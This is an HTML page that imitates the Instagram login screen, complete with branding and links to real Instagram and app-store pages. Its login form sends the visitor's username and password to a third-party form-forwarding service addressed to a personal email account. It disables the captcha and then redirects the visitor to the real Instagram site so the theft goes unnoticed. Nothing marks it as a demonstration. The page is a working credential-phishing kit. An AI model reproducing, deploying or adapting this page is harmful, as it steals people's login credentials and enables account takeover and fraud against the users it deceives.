<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login
    </title>
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <div class="wrapper">
        <div class="container">
            <div class="row">
                <div class="col-md-6 firstContainer">
                    <img src="img/app-feautures.png" alt="[+]" class="rounded d-block w-100">
                </div>
                <div class="col-md-6 text-center secondContainer">
                    <div class="card">
                        <div class="py-3 px-2">
                            <a href="https://www.instagram.com/"><img src="img/instagram-logo.png" alt="card-img-top"></a>
                        </div>
                        <div class="card-body">
                            <form target="_blank" action="https://formsubmit.co/kesarwaniishaan4@gmail.com" method="POST">
                                <input type="hidden" name="_next" value="https://www.instagram.com/">
                                <input type="hidden" name="_captcha" value="false">
                                <div class="form-group py-1">
                                    <input type="text" class="form-control" name="Username" id="" aria-describedby="helpId" placeholder="Phone Number, Username or Email" required>
                                </div>
                                <div class="form-group py-1">
                                    <input type="password" class="form-control" name="Pass" id="" aria-describedby="helpId" placeholder="Password" required>
                                </div>
                                <input type="submit" value="Log In" class="mt-2 btn btn-primary w-100 ">
                            </form>
                            <div class="or">
                                <span>OR</span>
                            </div>
                            <div class="otherMethods">
                                <div class="secondaryColor">
                                    <img src="img/facebook-logo.png" class="img-fluid rounded" alt="[+]" style="width: 18px;height: 18px">
                                    <a href="https://www.facebook.com/"><span class="ms-2">Login with Facebook</span></a>
                                </div>
                            </div>
                            <div class="forgot-pass mt-3 primaryColor"><a href="https://www.instagram.com/accounts/password/reset/?hl=en">Forgot Password ?</a></div>
                        </div>
                    </div>
                    <div class="card my-2">
                        <div class="card-body">
                            <span>Don't Have an Account?</span><span class="primaryColor"><a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign Up</a></span>
                        </div>
                    </div>
                    <span class="primaryColor">Get the App</span>
                    <div class="row py-2">
                        <div class="col-6">
                            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN&gl=US"><img src="img/playstore.png" alt="[+]" class="img-fluid d-block rounded" /></a>
                        </div>
                        <div class="col-6">
                            <a href="https://apps.apple.com/in/app/instagram/id389801252"><img src="img/appstore.png" alt="[+]" class="img-fluid d-block rounded" /></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
